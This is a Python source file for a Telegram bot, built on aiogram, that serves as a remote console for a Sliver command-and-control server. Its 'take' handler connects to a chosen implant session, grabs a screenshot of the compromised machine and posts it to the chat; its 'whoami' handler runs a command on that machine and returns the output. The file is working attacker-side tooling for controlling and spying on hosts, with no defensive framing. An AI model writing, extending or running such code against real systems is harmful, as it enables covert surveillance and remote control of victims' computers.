from aiogram import Router, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
#from notify.notify.py import extract_all_beacons
from aiogram import types
from aiogram.enums import ParseMode
import re
from aiogram.utils.formatting import Text, Bold, Code
from datetime import datetime, timezone
import copy
import config as cfg
from sliver import *
from aiogram.types import InputFile
from aiogram.types import FSInputFile
import os
import asyncio
from handlers import info

router = Router()
router.include_router(info.router)

logger = cfg.logger
CFG_PATH = cfg.CFG_PATH
reply_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="info")],
        [KeyboardButton(text="close")]
    ],
    resize_keyboard=True
)

#UUID_REGEX = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")

@router.message(lambda msg: msg.text == "/menu")
async def show_reply_menu(message: types.Message):
    await message.answer("hi", reply_markup=reply_kb)

#def format_time(time_to_format):
#    last_checkin_dt = datetime.fromtimestamp(time_to_format, tz=timezone.utc)
#    #formated_time = last_checkin_dt.strftime('%Y-%m-%d %H:%M:%S UTC')
#    formated_time = last_checkin_dt.strftime('%Y %a %d %b %H:%M:%S UTC')
#    current_time = datetime.now(timezone.utc)
#    time_diff = current_time - last_checkin_dt
#    seconds_ago = int(time_diff.total_seconds())
#    final_time = f"{formated_time} ({seconds_ago}s ago)"
#    return final_time 

@router.message(lambda msg: msg.text == "close")
async def close_action(message: types.Message):
    await message.answer("menu closed", reply_markup=types.ReplyKeyboardRemove())

@router.message(lambda message: 'take' in message.text)
async def take(message: types.Message):
    match = re.search(r'take (\d)', message.text)
    id = int(match.group(1))
    print(id)
    config = SliverClientConfig.parse_config_file(CFG_PATH)
    client = SliverClient(config)
    await client.connect()
    sessions = await client.sessions()
    logger.info(sessions[id])
    session = await client.interact_session(sessions[id].ID)
    screen = await session.screenshot()
    with open("1337.png", "wb") as f:
        f.write(screen.Data)
    photo_path = "1337.png"
    if os.path.exists(photo_path):
        logger.error(f"file found: {photo_path}")
    else:
        logger.error(f"file not found: {photo_path}")
    photo = FSInputFile(photo_path)
    try:
        await message.answer_photo(photo=photo, caption="done")
    except:
        await message.answer("error occured")

@router.message(lambda message: 'whoami' in message.text)
async def whoami(message: types.Message):
    match = re.search(r'whoami (\d)', message.text)
    id = int(match.group(1))
    print(id)
    config = SliverClientConfig.parse_config_file(CFG_PATH)
    client = SliverClient(config)
    await client.connect()
    sessions = await client.sessions()
    logger.error(sessions[id])
    session = await client.interact_session(sessions[id].ID)
    whoami = await session.execute('whoami', [], True)
    output_message = Text(Bold("output: \n"), Code(whoami))
    await message.answer(**output_message.as_kwargs())
